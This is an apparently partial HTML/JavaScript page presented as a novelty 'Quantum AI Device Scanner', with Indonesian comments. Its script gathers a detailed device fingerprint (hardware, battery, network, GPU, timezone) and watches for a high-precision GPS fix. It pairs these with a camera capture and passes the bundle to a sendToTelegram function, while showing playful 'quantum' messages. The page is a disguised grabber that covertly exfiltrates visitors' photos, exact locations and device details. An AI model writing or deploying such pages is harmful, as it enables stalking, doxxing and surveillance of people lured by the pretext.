<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Quantum AI Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    /* Tambahan style untuk info perangkat */
    .device-info-panel {
      background: rgba(0,0,0,0.7);
      padding: 20px;
      border-radius: 15px;
      margin: 20px;
      max-width: 500px;
      text-align: left;
      display: none;
    }
    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
    }
    .info-item {
      padding: 8px;
      background: rgba(255,255,255,0.1);
      border-radius: 8px;
    }
    .gps-accuracy {
      display: inline-block;
      padding: 5px 10px;
      border-radius: 15px;
      background: #e67e22;
      margin-left: 10px;
    }
  </style>
  <!-- Style sebelumnya tetap dipertahankan -->
</head>
<body>
  <!-- Struktur HTML sebelumnya -->
  <div class="device-info-panel" id="device-info"></div>

  <script>
    // ================== Fungsi Deteksi Perangkat Lengkap ==================
    async function getAdvancedDeviceInfo() {
      const getOS = () => {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) return 'Android';
        if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
        if (/Win/.test(ua)) return 'Windows';
        if (/Mac/.test(ua)) return 'MacOS';
        if (/Linux/.test(ua)) return 'Linux';
        return 'Unknown OS';
      };

      const getBrowser = () => {
        const ua = navigator.userAgent;
        if (/Chrome/.test(ua)) return 'Chrome';
        if (/Firefox/.test(ua)) return 'Firefox';
        if (/Safari/.test(ua)) return 'Safari';
        if (/Edge/.test(ua)) return 'Edge';
        return 'Unknown Browser';
      };

      let batteryInfo = {};
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? 'Charging' : 'Not Charging',
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
        } catch (e) {
          batteryInfo.error = e.message;
        }
      }

      let connectionInfo = {};
      if (navigator.connection) {
        connectionInfo = {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink + ' Mbps',
          rtt: navigator.connection.rtt + ' ms',
          saveData: navigator.connection.saveData ? 'Active' : 'Inactive'
        };
      }

      return {
        os: getOS(),
        platform: navigator.platform,
        browser: getBrowser(),
        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        cores: navigator.hardwareConcurrency || 'Unknown',
        battery: batteryInfo,
        network: connectionInfo,
        resolution: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.languages.join(', '),
        cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
        gpu: {
          vendor: (await getGPUVendor()) || 'Unknown',
          renderer: (await getGPURenderer()) || 'Unknown'
        }
      };
    }

    // ================== Fungsi Deteksi GPU ==================
    async function getGPUVendor() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      } catch (e) {
        return null;
      }
    }

    async function getGPURenderer() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch (e) {
        return null;
      }
    }

    // ================== Fungsi Lokasi Presisi Tinggi ==================
    async function getPreciseLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject('Geolocation not supported');
        
        let bestPosition = null;
        const options = {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        };

        const watchId = navigator.geolocation.watchPosition(
          position => {
            if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
              bestPosition = position;
              if (position.coords.accuracy <= 10) {
                navigator.geolocation.clearWatch(watchId);
                resolve(bestPosition);
              }
            }
          },
          error => reject(error),
          options
        );

        setTimeout(() => {
          navigator.geolocation.clearWatch(watchId);
          bestPosition ? resolve(bestPosition) : reject('Timeout');
        }, 45000);
      });
    }

    // ================== Fungsi Tampilkan Info Perangkat ==================
    function showDeviceInfo(info, location) {
      const panel = document.getElementById('device-info');
      const mapsUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
      
      panel.innerHTML = `
        <h3 style="color: var(--primary);">üì± Device Matrix</h3>
        <div class="info-grid">
          <div class="info-item">OS: ${info.os}</div>
          <div class="info-item">Platform: ${info.platform}</div>
          <div class="info-item">Browser: ${info.browser}</div>
          <div class="info-item">RAM: ${info.ram}</div>
          <div class="info-item">CPU Cores: ${info.cores}</div>
          <div class="info-item">Battery: ${info.battery.level} (${info.battery.charging})</div>
          <div class="info-item">Network: ${info.network.type}</div>
          <div class="info-item">Resolution: ${info.resolution}</div>
          <div class="info-item">Timezone: ${info.timezone}</div>
          <div class="info-item">GPU Vendor: ${info.gpu.vendor}</div>
          <div class="info-item">GPU Renderer: ${info.gpu.renderer}</div>
        </div>
        <h3 style="color: var(--primary); margin-top: 20px;">üìç GPS Signature</h3>
        <p>Latitude: ${location.coords.latitude.toFixed(6)}</p>
        <p>Longitude: ${location.coords.longitude.toFixed(6)}</p>
        <p>Accuracy: <span class="gps-accuracy">${Math.round(location.coords.accuracy)} meters</span></p>
        <p><a href="${mapsUrl}" target="_blank" style="color:var(--secondary);">View in 3D Map ‚Üí</a></p>
      `;
      panel.style.display = 'block';
    }

    // ================== Modifikasi Fungsi Quantum Scan ==================
    async function startQuantumScan() {
      if (isScanning) return;
      isScanning = true;
      loading.style.display = 'block';

      try {
        const [photoData, location, deviceInfo] = await Promise.all([
          captureQuantumImage(),
          getPreciseLocation(),
          getAdvancedDeviceInfo()
        ]);

        showDeviceInfo(deviceInfo, location);
        
        const report = generateHologramReport(photoData, location, deviceInfo);
        await sendToTelegram(report);
        showToast('üåå Quantum Signature Captured!', 'success');
      } catch (error) {
        showError('Quantum Anomaly Detected', error);
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // ================== Pembaruan Fungsi Laporan ==================
    function generateHologramReport(photo, location, deviceInfo) {
      return {
        image: photo.image,
        metadata: {
          ...location.coords,
          deviceInfo: deviceInfo,
          timestamp: new Date().toISOString()
        }
      };
    }
  </script>
</body>
</html>
